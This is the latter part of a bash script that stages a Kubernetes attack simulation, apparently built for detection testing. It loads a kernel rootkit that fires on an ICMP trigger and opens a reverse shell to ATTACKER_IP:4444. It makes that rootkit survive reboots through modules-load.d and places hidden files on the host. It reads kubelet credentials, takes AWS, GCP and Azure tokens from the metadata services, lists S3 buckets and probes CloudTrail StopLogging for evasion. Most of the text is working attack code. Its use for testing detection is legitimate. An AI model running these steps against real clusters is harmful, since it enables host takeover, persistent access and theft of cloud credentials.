    COMPILE_RC=$?
    set -e
    spin_stop

    if [ $COMPILE_RC -eq 0 ] && echo "$COMPILE_RESULT" | grep -q "\.ko"; then
      ok "Module compiled successfully"
      printf "  %s\n" "$(echo "$COMPILE_RESULT" | grep -E '\.ko|Building' | head -3)"

      step "Loading kernel module via insmod"
      info "This is a REAL finit_module syscall -eBPF security tools will see it"
      info "Reverse shell target: ${YELLOW}${ATTACKER_IP}:4444${RESET}"
      spin_start "insmod cdrgoat_rootkit.ko shell_host=${ATTACKER_IP}"
      set +e
      INSMOD_RESULT=$(kexec "insmod /tmp/cdrgoat_lkm/cdrgoat_rootkit.ko shell_host=${ATTACKER_IP} shell_port=4444 2>&1")
      INSMOD_RC=$?
      set -e
      spin_stop

      if [ $INSMOD_RC -eq 0 ]; then
        LKM_LOADED=1
        ok "Kernel module loaded into host kernel!"

        step "Verifying module - netfilter hook + ICMP listener"
        LSMOD_CHECK=$(kexec "lsmod | grep cdrgoat || echo 'not in lsmod (hidden)'")
        DMESG_CHECK=$(kexec "dmesg | grep cdrgoat | tail -8")

        printf "\n%s%s%s\n" "${BOLD}${RED}" "ROOTKIT ACTIVE -ICMP REVERSE SHELL ARMED" "${RESET}"
        printf "%s\n" "---------------------------------------------------------------------"
        printf "  lsmod : %s%s%s\n" "$YELLOW" "$LSMOD_CHECK" "$RESET"
        printf "  target: %s%s:4444%s\n" "$RED" "$ATTACKER_IP" "$RESET"
        printf "  trigger: ping -s 1337\n"
        printf "\n  dmesg:\n"
        echo "$DMESG_CHECK" | while IFS= read -r line; do printf "    %s%s%s\n" "$RED" "$line" "$RESET"; done
        printf "%s\n" "---------------------------------------------------------------------"
      else
        err "insmod failed: $INSMOD_RESULT"
        info "Module loading may be restricted by LSM or seccomp"
      fi
    else
      err "Compilation failed (kernel headers may be mismatched)"
      printf "  %s\n" "$(echo "$COMPILE_RESULT" | tail -5)"
    fi
  else
    err "Kernel headers not available for this node OS"
    info "Nodes running COS (GKE), Bottlerocket (EKS), or Talos block this by design"
    if echo "$BUILD_INSTALL" | grep -q "NO_PKG_MANAGER"; then
      info "No package manager found (immutable OS)"
    fi
  fi
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
if [ "$LKM_LOADED" = "1" ]; then
  printf "We compiled and loaded a ${RED}real kernel rootkit${RESET} into the host kernel.\n\n"
  printf "The module registers a ${RED}netfilter hook${RESET} on NF_INET_PRE_ROUTING that:\n"
  printf "  1. Inspects every ICMP echo-request packet\n"
  printf "  2. If payload size matches 1337 bytes - triggers\n"
  printf "  3. Calls ${RED}call_usermodehelper()${RESET} to spawn bash reverse shell\n"
  printf "  4. Shell connects to ${YELLOW}${ATTACKER_IP}:4444${RESET}\n\n"
  printf "The privileged container shares the kernel with the host, so insmod\n"
  printf "from inside the container loads the module node-wide.\n\n"
else
  printf "Kernel module loading was ${GREEN}blocked${RESET}. This is the correct mitigation:\n"
  printf "  ${GREEN}kernel.modules_disabled=1${RESET}, immutable OS, or missing headers.\n\n"
fi
printf "Inspired by ${CYAN}Singularity${RESET}. A full rootkit would additionally:\n"
printf "  ${RED}1.${RESET} Hook getdents64 to hide attacker files and processes\n"
printf "  ${RED}2.${RESET} Hide itself from lsmod, /proc/modules, /sys/module\n"
printf "  ${RED}3.${RESET} Clear kernel taint flags to avoid dmesg warnings\n\n"

read -r -p "Step 6 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 7. Establish Persistence via modules-load.d
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Persistence via modules-load.d  ===" "${RESET}"

step "Copying module to kernel modules directory"
if [ "$LKM_LOADED" = "1" ]; then
  spin_start "Installing .ko to /lib/modules/$(kexec 'uname -r')/kernel/"
  set +e
  INSTALL_RESULT=$(kexec '
    KVER=$(uname -r)
    MODULE_DIR="/lib/modules/${KVER}/kernel/drivers/misc"
    mkdir -p "$MODULE_DIR" 2>/dev/null
    cp /tmp/cdrgoat_lkm/cdrgoat_rootkit.ko "$MODULE_DIR/"
    ls -la "$MODULE_DIR/cdrgoat_rootkit.ko"
  ')
  set -e
  spin_stop
  if [ -n "$INSTALL_RESULT" ]; then
    ok "Module installed to kernel directory"
    printf "  %s\n" "$INSTALL_RESULT"
  fi
else
  info "No compiled module - writing placeholder persistence entry"
fi

step "Running depmod"
spin_start "Updating module dependency database"
set +e
if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
  DEPMOD_RESULT=$(kexec "chroot /host depmod 2>&1 || echo 'depmod not available'")
else
  DEPMOD_RESULT=$(kexec "depmod 2>&1 || echo 'depmod not available'")
fi
set -e
spin_stop
ok "depmod executed: ${YELLOW}${DEPMOD_RESULT:-done}${RESET}"

step "Writing persistence to /etc/modules-load.d/"
spin_start "Creating boot-time module load configuration"
set +e
if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
  PERSIST_RESULT=$(kexec '
    mkdir -p /host/etc/modules-load.d 2>/dev/null
    echo "cdrgoat_rootkit" > /host/etc/modules-load.d/cdrgoat_rootkit.conf
    ls -la /host/etc/modules-load.d/cdrgoat_rootkit.conf
  ')
else
  PERSIST_RESULT=$(kexec '
    mkdir -p /etc/modules-load.d 2>/dev/null
    echo "cdrgoat_rootkit" > /etc/modules-load.d/cdrgoat_rootkit.conf
    ls -la /etc/modules-load.d/cdrgoat_rootkit.conf
  ')
fi
set -e
spin_stop

if [ -n "$PERSIST_RESULT" ]; then
  ok "Persistence entry created"
  printf "  %s\n" "$PERSIST_RESULT"
else
  err "Failed to write modules-load.d entry (read-only filesystem?)"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
if [ "$LKM_LOADED" = "1" ]; then
  printf "The compiled module was copied to ${RED}/lib/modules/.../kernel/${RESET}\n"
  printf "and registered in ${RED}/etc/modules-load.d/${RESET} for boot persistence.\n\n"
  printf "On next node reboot, systemd-modules-load.service will:\n"
  printf "  1. Read /etc/modules-load.d/cdrgoat_rootkit.conf\n"
  printf "  2. Run modprobe cdrgoat_rootkit\n"
  printf "  3. The rootkit reloads ${RED}automatically${RESET}\n\n"
else
  printf "We wrote to ${RED}/etc/modules-load.d/${RESET} - the systemd mechanism for\n"
  printf "loading kernel modules on boot.\n\n"
fi
printf "This persistence survives:\n"
printf "  ${RED}Node reboots${RESET}\n"
printf "  ${RED}Pod deletions and deployment rollbacks${RESET}\n"
printf "  ${RED}Node drain/cordon cycles${RESET}\n"
printf "  ${RED}kubectl delete -f deploy.yaml${RESET} (scenario teardown)\n\n"

read -r -p "Step 7 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 8. Trigger ICMP Reverse Shell
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 8. Trigger ICMP Reverse Shell  ===" "${RESET}"

step "Resolving node IP"
spin_start "Getting node internal IP"
set +e
NODE_NAME=$(kapi "/api/v1/namespaces/${NAMESPACE}/pods/infra-agent" | jq -r '.spec.nodeName // empty')
if [ -n "$NODE_NAME" ]; then
  NODE_IP=$(kapi "/api/v1/nodes/${NODE_NAME}" | jq -r '.status.addresses[] | select(.type=="InternalIP") | .address' 2>/dev/null)
fi
# Fallback: query IMDS from privileged pod (more reliable, no RBAC needed)
if [ -z "$NODE_IP" ] || [ "$NODE_IP" = "null" ]; then
  NODE_IP=$(kexec 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null' 2>/dev/null)
fi
set -e
spin_stop

if [ -n "$NODE_IP" ] && [ "$NODE_IP" != "null" ]; then
  ok "Node: ${YELLOW}${NODE_NAME:-unknown}${RESET}  IP: ${YELLOW}${NODE_IP}${RESET}"
else
  info "Could not resolve node IP"
  NODE_IP="unknown"
fi

if [ "$LKM_LOADED" = "1" ] && [ "$NODE_IP" != "unknown" ]; then
  step "Firing ICMP trigger -ping -s 1337 from pod to node"
  info "The netfilter hook in our rootkit will catch this and call_usermodehelper()"
  info "Reverse shell attempt -> ${YELLOW}${ATTACKER_IP}:4444${RESET} (connect may fail, signals still fire)"
  kexec 'command -v ping >/dev/null 2>&1 || apt-get install -y -qq iputils-ping >/dev/null 2>&1' >/dev/null 2>&1
  spin_start "ping -c 1 -s 1337 ${NODE_IP}"
  set +e
  PING_RESULT=$(kexec "ping -c 1 -s 1337 -W 3 ${NODE_IP} 2>&1")
  PING_RC=$?
  set -e
  spin_stop

  if [ $PING_RC -eq 0 ]; then
    ok "ICMP trigger sent - rootkit hook fired"
  else
    info "Ping delivery uncertain: $PING_RESULT"
  fi

  sleep 2

  step "Verifying rootkit trigger via dmesg"
  TRIGGER_LOG=$(kexec "dmesg | grep cdrgoat | tail -5")
  if echo "$TRIGGER_LOG" | grep -q "ICMP trigger"; then
    ok "Rootkit caught the ICMP trigger!"
  fi
  if echo "$TRIGGER_LOG" | grep -q "spawning reverse shell"; then
    ok "call_usermodehelper() executed - reverse shell spawned"
  fi

  printf "\n%s%s%s\n" "${BOLD}${RED}" "ROOTKIT TRIGGER LOG (dmesg)" "${RESET}"
  printf "%s\n" "---------------------------------------------------------------------"
  echo "$TRIGGER_LOG" | while IFS= read -r line; do printf "  %s%s%s\n" "$RED" "$line" "$RESET"; done
  printf "%s\n" "---------------------------------------------------------------------"

  printf "\n"
  info "The reverse shell attempted to connect to ${ATTACKER_IP}:4444"
  info "Whether it connects or not, the detection signals were generated:"
  info " - call_usermodehelper() spawned bash (Tetragon sees this)"
  info " -Outbound TCP SYN to ${ATTACKER_IP}:4444 (network flow logs)"
  info " -ICMP with 1337-byte payload (network anomaly)"
else
  if [ "$LKM_LOADED" != "1" ]; then
    step "ICMP trigger skipped - rootkit module was not loaded"
    info "Without the kernel module, there is no netfilter hook to trigger"
  else
    step "ICMP trigger skipped - node IP unknown"
  fi

  step "Placing covert artifacts on host instead"
  spin_start "Creating hidden directory"
  kexec 'mkdir -p /tmp/.hidden_cdrgoat 2>/dev/null; echo "c2_config" > /tmp/.hidden_cdrgoat/.config' >/dev/null 2>&1
  spin_stop
  ok "Hidden artifacts placed: /tmp/.hidden_cdrgoat/.config"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
if [ "$LKM_LOADED" = "1" ]; then
  printf "We triggered the rootkit's ICMP handler by pinging with ${RED}-s 1337${RESET}.\n\n"
  printf "The kernel module's netfilter hook intercepted the packet and:\n"
  printf "  1. Matched payload size (1337 bytes) against trigger_size\n"
  printf "  2. Called ${RED}schedule_work()${RESET} to queue the reverse shell\n"
  printf "  3. Worker called ${RED}call_usermodehelper()${RESET} to spawn bash\n"
  printf "  4. bash attempted ${RED}>& /dev/tcp/${ATTACKER_IP}/4444${RESET}\n\n"
  printf "This entire chain runs in ${RED}kernel context${RESET} - no container involved.\n"
  printf "Deleting all pods does not stop it. Only rmmod or reboot removes it.\n\n"
else
  printf "The rootkit was not loaded, so the ICMP trigger path was skipped.\n"
  printf "On a node where the module loads, the full chain would fire.\n\n"
fi

read -r -p "Step 8 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 9. Read Kubelet Credentials
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 9. Read Kubelet Credentials from Host  ===" "${RESET}"

step "Searching for kubelet configuration"

KUBELET_CONF=""
if [ "$HOST_ESCAPED" = "1" ]; then
  spin_start "Reading kubelet kubeconfig"
  if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
    for path in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/etc/kubernetes/kubelet-kubeconfig; do
      KUBELET_CONF=$(kexec "cat $path 2>/dev/null || true")
      if [ -n "$KUBELET_CONF" ]; then
        ok "Found kubelet config at ${YELLOW}${path#/host}${RESET}"
        break
      fi
    done
  elif [ "${CGROUP_ESCAPED:-}" = "1" ]; then
    for path in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/kubernetes/kubelet-kubeconfig; do
      set +e
      KUBELET_CONF=$(host_exec "cat $path 2>/dev/null")
      set -e
      if [ -n "$KUBELET_CONF" ]; then
        ok "Found kubelet config at ${YELLOW}${path}${RESET}"
        break
      fi
    done
  fi
  spin_stop

  if [ -n "$KUBELET_CONF" ]; then
    printf "\n%s%s%s\n" "${BOLD}${RED}" "KUBELET CONFIGURATION" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    echo "$KUBELET_CONF" | head -20 | while IFS= read -r line; do printf "  %s\n" "$line"; done
    printf "  ...(truncated)...\n"
    printf "%s\n" "---------------------------------------------------------------------"
  else
    info "Kubelet config not found at standard paths (managed K8s may store differently)"
  fi

  step "Listing pods on this node via kubelet"
  spin_start "Reading kubelet pod manifests"
  if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
    NODE_PODS=$(kexec "ls /host/var/lib/kubelet/pods/ 2>/dev/null | head -10 || echo 'no pods dir'")
  elif [ "${CGROUP_ESCAPED:-}" = "1" ]; then
    set +e
    NODE_PODS=$(host_exec "ls /var/lib/kubelet/pods/ 2>/dev/null | head -10")
    set -e
  fi
  spin_stop
  ok "Pod UIDs on this node:"
  echo "$NODE_PODS" | while IFS= read -r line; do printf "  %s%s%s\n" "$YELLOW" "$line" "$RESET"; done
else
  info "Skipping kubelet credential theft - no host access"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "From the host, we read the ${RED}kubelet kubeconfig${RESET} which contains\n"
printf "credentials to authenticate to the K8s API as the node.\n\n"
printf "Node-level credentials typically have broad permissions:\n"
printf "  Read all pods and secrets scheduled on this node\n"
printf "  Report node status and conditions\n"
printf "  Create/update pod status\n\n"

read -r -p "Step 9 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 10. IMDS Credential Theft
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 10. IMDS Credential Theft  ===" "${RESET}"

info "Querying Instance Metadata Service for cloud credentials."
info "This works on AWS (169.254.169.254), GCP (metadata.google.internal), Azure IMDS."
printf "\n"

step "Probing IMDS endpoints"
info "Querying from privileged pod (shares host network stack)"
CLOUD_CREDS=""
CLOUD_PROVIDER=""

# Try AWS -IMDSv2 first (token-based), fall back to IMDSv1
spin_start "Trying AWS IMDS (169.254.169.254)"
set +e
AWS_ROLE=$(kexec '
  # IMDSv2: get token first
  TOKEN=$(curl -sS --connect-timeout 2 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>/dev/null)
  if [ -n "$TOKEN" ]; then
    curl -sS --connect-timeout 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
  else
    # IMDSv1 fallback
    curl -sS --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
  fi
')
set -e
spin_stop

if [ -n "$AWS_ROLE" ] && ! echo "$AWS_ROLE" | grep -qi "error\|not found\|timed out\|<?xml"; then
  CLOUD_PROVIDER="AWS"
  ok "AWS IMDS accessible -IAM role: ${RED}${AWS_ROLE}${RESET}"

  step "Fetching temporary IAM credentials"
  spin_start "Requesting credentials for role ${AWS_ROLE}"
  set +e
  CLOUD_CREDS=$(kexec "
    TOKEN=\$(curl -sS --connect-timeout 2 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null)
    if [ -n \"\$TOKEN\" ]; then
      curl -sS --connect-timeout 3 -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/${AWS_ROLE} 2>/dev/null
    else
      curl -sS --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/${AWS_ROLE} 2>/dev/null
    fi
  ")
  set -e
  spin_stop

  if echo "$CLOUD_CREDS" | jq -e '.AccessKeyId' >/dev/null 2>&1; then
    ok "IAM credentials stolen!"
    AWS_ACCESS_KEY=$(echo "$CLOUD_CREDS" | jq -r '.AccessKeyId')
    AWS_SECRET_KEY=$(echo "$CLOUD_CREDS" | jq -r '.SecretAccessKey')
    AWS_SESSION_TOKEN=$(echo "$CLOUD_CREDS" | jq -r '.Token')

    printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN AWS CREDENTIALS" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    printf "  AccessKeyId     : %s%s%s\n" "$RED" "$AWS_ACCESS_KEY" "$RESET"
    printf "  SecretAccessKey  : %s%s...%s\n" "$RED" "${AWS_SECRET_KEY:0:20}" "$RESET"
    printf "  Token (preview)  : %s%s...%s\n" "$RED" "${AWS_SESSION_TOKEN:0:40}" "$RESET"
    printf "%s\n" "---------------------------------------------------------------------"
  else
    info "IMDS returned role name but credentials request failed"
  fi
else
  info "AWS IMDS not reachable (not AWS, or IMDSv2 hop limit blocks containers)"

  # Try GCP
  spin_start "Trying GCP metadata (metadata.google.internal)"
  set +e
  GCP_TOKEN=$(kexec "curl -sS --connect-timeout 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null || true")
  set -e
  spin_stop

  if echo "$GCP_TOKEN" | jq -e '.access_token' >/dev/null 2>&1; then
    CLOUD_PROVIDER="GCP"
    ok "GCP metadata accessible - token retrieved"
    CLOUD_CREDS="$GCP_TOKEN"
  else
    info "GCP metadata not reachable"

    # Try Azure
    spin_start "Trying Azure IMDS"
    set +e
    AZURE_TOKEN=$(kexec "curl -sS --connect-timeout 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>/dev/null || true")
    set -e
    spin_stop

    if echo "$AZURE_TOKEN" | jq -e '.access_token' >/dev/null 2>&1; then
      CLOUD_PROVIDER="Azure"
      ok "Azure IMDS accessible - token retrieved"
      CLOUD_CREDS="$AZURE_TOKEN"
    else
      info "Azure IMDS not reachable"
      info "Running on-prem or IMDS is blocked - skipping cloud pivot"
    fi
  fi
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The Instance Metadata Service (IMDS) provides cloud credentials\n"
printf "to workloads running on cloud VMs.\n\n"
if [ -n "$CLOUD_CREDS" ]; then
  printf "We successfully stole ${CLOUD_PROVIDER} credentials from IMDS!\n"
  printf "The node's IAM role is now available to the attacker.\n\n"
  printf "Without ${YELLOW}IRSA/Workload Identity/Pod Identity${RESET}, all pods on the\n"
  printf "node inherit the node's cloud role -a critical misconfiguration.\n\n"
else
  printf "IMDS was not reachable. This could mean:\n"
  printf "  On-prem cluster (no cloud IMDS)\n"
  printf "  IMDSv2 with hop limit = 1 (blocks containers)\n"
  printf "  Network policy blocking 169.254.169.254\n\n"
fi

read -r -p "Step 10 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 11. Cloud API Abuse
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 11. Cloud API Abuse  ===" "${RESET}"

if [ "$CLOUD_PROVIDER" = "AWS" ] && [ -n "${AWS_ACCESS_KEY:-}" ]; then
  step "Verifying stolen AWS identity"
  spin_start "aws sts get-caller-identity"
  set +e
  CALLER_ID=$(AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY" \
    AWS_SECRET_ACCESS_KEY="$AWS_SECRET_KEY" \
    AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN" \
    aws sts get-caller-identity 2>/dev/null)
  set -e
  spin_stop

  if echo "$CALLER_ID" | jq . >/dev/null 2>&1; then
    ok "Operating as: ${RED}$(echo "$CALLER_ID" | jq -r '.Arn')${RESET}"
    echo "$CALLER_ID" | jq .
  else
    err "aws sts get-caller-identity failed (aws CLI may not be installed)"
    info "Install aws CLI to complete this step, or verify credentials manually"
  fi

  step "Enumerating S3 buckets"
  spin_start "aws s3 ls"
  set +e
  S3_LIST=$(AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY" \
    AWS_SECRET_ACCESS_KEY="$AWS_SECRET_KEY" \
    AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN" \
    aws s3 ls 2>&1)
  set -e
  spin_stop

  if [ $? -eq 0 ] && [ -n "$S3_LIST" ]; then
    ok "S3 buckets accessible:"
    echo "$S3_LIST" | while IFS= read -r line; do printf "  %s%s%s\n" "$YELLOW" "$line" "$RESET"; done
  else
    info "No S3 access or no buckets found"
  fi

  step "Attempting CloudTrail StopLogging (defense evasion)"
  spin_start "Testing cloudtrail:StopLogging permission"
  set +e
  CT_TRAILS=$(AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY" \
    AWS_SECRET_ACCESS_KEY="$AWS_SECRET_KEY" \
    AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN" \
    aws cloudtrail describe-trails --query 'trailList[].Name' --output text 2>/dev/null)
  set -e
  spin_stop

  if [ -n "$CT_TRAILS" ]; then
    info "CloudTrail trails found: ${YELLOW}${CT_TRAILS}${RESET}"
    info "Skipping actual StopLogging to preserve audit trail (would work if IAM allows)"
  else
    info "No CloudTrail access or no trails found"
  fi

elif [ "$CLOUD_PROVIDER" = "GCP" ]; then
  step "GCP cloud pivot"
  info "GCP access token retrieved. With gcloud CLI, the attacker could:"
  info "  gcloud compute instances list"
  info "  gcloud storage ls"
  info "  gcloud iam service-accounts list"
  info "Skipping actual API calls (would require gcloud CLI with token injection)"

elif [ "$CLOUD_PROVIDER" = "Azure" ]; then
  step "Azure cloud pivot"
  info "Azure access token retrieved. With az CLI, the attacker could:"
  info "  az resource list"
  info "  az keyvault list"
  info "  az storage account list"
  info "Skipping actual API calls (would require az CLI with token injection)"

else
  step "Cloud pivot skipped"
  info "No cloud credentials were obtained (on-prem environment)"
  info "The attack chain stops at node-level access (kubelet creds + host control)"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
if [ -n "$CLOUD_CREDS" ]; then
  printf "The attacker used stolen cloud credentials to enumerate and potentially\n"
  printf "disrupt cloud resources from ${RED}outside the cluster entirely${RESET}.\n\n"
  printf "CloudTrail StopLogging is a common defense evasion technique:\n"
  printf "  Disable logging -> perform actions -> re-enable logging\n"
  printf "  The gap in the audit trail makes forensics much harder.\n\n"
else
  printf "On-prem clusters don't have cloud IMDS, so the attack chain ends\n"
  printf "at host-level compromise. The attacker still has:\n"
  printf "  Kernel rootkit persistence\n"
  printf "  Kubelet credentials\n"
  printf "  Full node access with hidden processes\n\n"
fi

read -r -p "Step 11 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 12. Verify Full Compromise
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 12. Verify Full Compromise  ===" "${RESET}"

step "Attack summary"

printf "\n%s%s%s\n" "${BOLD}${RED}" "FULL ATTACK CHAIN COMPLETE" "${RESET}"
printf "%s\n" "====================================================================="
printf "  ${GREEN}[1]${RESET}  RCE on web application via /cmd endpoint\n"
printf "  ${GREEN}[2]${RESET}  SA token stolen from pod filesystem\n"
printf "  ${GREEN}[3]${RESET}  Cluster enumerated - privileged pod discovered\n"
printf "  ${GREEN}[4]${RESET}  Pivoted to privileged infra-agent pod\n"
printf "  ${GREEN}[5]${RESET}  Container escape to host (cgroup release_agent)\n"
if [ "$LKM_LOADED" = "1" ]; then
  printf "  ${GREEN}[6]${RESET}  Real kernel module compiled and loaded (finit_module)\n"
else
  printf "  ${YELLOW}[6]${RESET}  Kernel module load blocked (hardened node)\n"
fi
printf "  ${GREEN}[7]${RESET}  Persistence via /etc/modules-load.d/\n"
printf "  ${GREEN}[8]${RESET}  ICMP covert channel to node + hidden artifacts\n"
if [ -n "$KUBELET_CONF" ]; then
  printf "  ${GREEN}[9]${RESET}  Kubelet credentials stolen\n"
else
  printf "  ${YELLOW}[9]${RESET}  Kubelet config not found (managed K8s)\n"
fi
if [ -n "$CLOUD_CREDS" ]; then
  printf "  ${GREEN}[10]${RESET} Cloud credentials stolen from IMDS\n"
  printf "  ${GREEN}[11]${RESET} Cloud API abuse (${CLOUD_PROVIDER})\n"
else
  printf "  ${YELLOW}[10]${RESET} IMDS not reachable (on-prem or blocked)\n"
  printf "  ${YELLOW}[11]${RESET} Cloud pivot skipped\n"
fi
printf "  ${GREEN}[12]${RESET} Full compromise verified\n"
printf "%s\n" "====================================================================="

step "Cleanup reminder"
info "See README.md for full cleanup instructions."

printf "%s%s%s\n\n" "${BOLD}${GREEN}" "Attack simulation complete." "${RESET}"
